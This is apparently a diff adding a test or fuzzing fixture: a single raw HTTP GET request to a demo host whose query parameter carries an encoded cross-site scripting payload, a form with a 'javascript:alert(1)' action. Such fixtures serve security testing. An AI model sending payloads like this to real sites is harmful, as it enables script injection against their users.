@@ -1,0 +1,4 @@
+GET /a?input=%26lt;form%20action%3D%26quot;javascript:alert(1)%26quot;%26gt;%26lt;button%26gt;x%26lt;/button%26gt;%26lt;/form%26gt; HTTP/1.1
+Host: demo.example.com
+Connection: close
+
